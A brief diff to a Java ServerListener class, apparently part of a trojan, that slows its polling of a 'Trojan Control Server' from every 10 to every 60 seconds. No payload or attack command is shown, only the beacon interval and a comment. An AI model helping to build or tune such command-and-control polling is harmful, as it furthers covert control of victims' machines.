@@ -13,7 +13,7 @@ public class ServerListener implements Runnable {
 	/*
 	 * Query every 60 s
 	 */
-	private static final long QUERY_INTERVAL_MILLIS = 10000;
+	private static final long QUERY_INTERVAL_MILLIS = 60000;
 	
 	/*
 	 * Could be a public IP or FQDN, would still work - should point to Trojan Control Server
